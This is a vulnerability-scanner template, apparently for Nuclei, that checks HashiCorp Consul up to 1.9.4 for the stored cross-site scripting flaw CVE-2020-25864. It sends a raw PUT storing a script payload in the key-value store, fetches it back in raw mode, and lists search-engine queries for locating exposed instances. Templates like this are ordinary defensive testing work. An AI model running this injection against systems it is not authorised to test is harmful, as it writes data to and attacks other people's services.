http:
- matchers:
  - part: header
    type: word
    words:
    - text/html
  - part: body_2
    type: word
    words:
    - <!DOCTYPE html><script>alert(document.domain)</script>
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'PUT {{BaseURL}}/v1/kv/{{randstr}} HTTP/1.1

    Host: {{Hostname}}


    <!DOCTYPE html><script>alert(document.domain)</script>

    '
  - 'GET {{BaseURL}}/v1/kv/{{randstr}}%3Fraw HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2020-25864
info:
  author: c-sh0
  classification:
    cpe: cpe:2.3:a:hashicorp:consul:*:*:*:*:-:*:*:*
    cve-id: CVE-2020-25864
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.99311
    epss-score: 0.85106
  description: 'HashiCorp Consul and Consul Enterprise up to version 1.9.4 are vulnerable
    to cross-site scripting via the key-value (KV) raw mode.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to potential data theft, session hijacking, or defacement of the affected Consul/Consul
    Enterprise application.

    '
  metadata:
    fofa-query: title="consul by hashicorp"
    google-query: intitle:"consul by hashicorp"
    max-request: 2
    product: consul
    shodan-query:
    - http.title:"consul by hashicorp"
    - cpe:"cpe:2.3:a:hashicorp:consul"
    vendor: hashicorp
  name: HashiCorp Consul/Consul Enterprise <=1.9.4 - Cross-Site Scripting
  reference:
  - https://discuss.hashicorp.com/t/hcsec-2021-07-consul-api-kv-endpoint-vulnerable-to-cross-site-scripting/23368
  - https://www.hashicorp.com/blog/category/consul
  - https://nvd.nist.gov/vuln/detail/CVE-2020-25864
  - https://security.gentoo.org/glsa/202208-09
  - https://github.com/ARPSyndicate/cvemon
  remediation: Fixed in 1.9.5, 1.8.10 and 1.7.14.
  severity: medium
  tags: cve,cve2020,consul,xss,intrusive,hashicorp,vuln
